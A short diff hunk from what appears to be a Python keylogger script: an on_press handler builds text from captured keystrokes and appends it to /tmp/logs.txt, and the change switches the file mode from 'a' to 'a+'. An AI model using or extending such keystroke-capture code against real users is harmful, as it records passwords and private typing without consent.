@@ -32,7 +32,7 @@ def on_press(key):
     else:
         text += str(key).strip("'")
 
-    with open("/tmp/logs.txt", "a") as thelogs:
+    with open("/tmp/logs.txt", "a+") as thelogs:
         thelogs.write(text)
 
 # Press esc to break from the listener
